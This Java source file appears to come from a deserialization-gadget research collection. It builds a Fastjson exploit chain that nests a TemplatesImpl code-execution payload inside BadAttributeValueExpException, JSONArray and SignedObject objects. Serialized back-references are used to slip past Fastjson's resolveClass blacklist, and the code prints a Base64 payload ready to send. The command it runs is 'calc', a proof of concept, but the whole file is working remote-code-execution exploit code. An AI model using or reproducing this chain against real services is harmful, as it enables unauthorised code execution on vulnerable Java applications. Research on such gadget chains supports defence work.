package gadget.fastjson;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import gadget.doubleunser.MyInputStream;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/*
* 绕过第一次的TemplatesImpl黑名单检查
* BadAttributeValueExpException#readObject
* JSONOBJECT#toString
* SignedObject#getObject
* 二次反序列化
* 引用绕过JSON自带resolveClass的黑名单检查
    * 二次反序列化时ArrayList先通过readObject恢复TemplatesImpl对象接着恢复BadAttributeValueExpException对象
    * 由于BadAttributeValueExpException要恢复val对应的JSONArray从而触发JSONArray的readObject方法
    * 此时过程委托给FJ自带的SecureObjectInputStream
    * 在恢复JSONArray/JSONObject中的TemplatesImpl对象时
    * 由于此时的第二个TemplatesImpl对象是引用类型
    * 引用类型不会触发resolveClass，结束。
* */
public class FJ2 {
    public static void main(String[] args) throws Exception{

        List<Object> list = new ArrayList<>();

        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows("calc");

        list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测

        JSONArray jsonArray2 = new JSONArray();
        jsonArray2.add(templates);           //此时在handles这个hash表中查到了映射，后续则会以引用形式输出

        BadAttributeValueExpException bd2 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(bd2,"val",jsonArray2);

        list.add(bd2);

        //二次反序列化
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(), Signature.getInstance("DSA"));

        //触发SignedObject#getObject
        JSONArray jsonArray1 = new JSONArray();
        jsonArray1.add(signedObject);

        BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(bd1,"val",jsonArray1);

        //验证
        byte[] payload = SerializerUtils.serialize(bd1);

        System.out.println(Base64.getEncoder().encodeToString(payload));

//        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));  //再套一层inputstream检查TemplatesImpl，不可用
//        ois.readObject();

    }
}
